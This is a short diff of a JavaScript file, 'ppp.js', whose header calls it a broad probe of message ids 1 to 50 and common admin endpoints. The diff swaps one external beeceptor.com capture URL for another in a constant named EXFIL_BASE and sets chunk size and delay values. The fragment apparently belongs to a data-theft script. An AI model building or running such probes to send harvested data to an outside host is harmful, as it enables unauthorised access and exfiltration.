@@ -1,5 +1,5 @@
 // ppp.js - broad probe: messages id 1..50 + common admin endpoints
-const EXFIL_BASE = "https://lululele.free.beeceptor.com";
+const EXFIL_BASE = "https://pipipopo.free.beeceptor.com";
 const CHUNK = 400;     // smaller to avoid truncation
 const SLEEP_MS = 180;
 
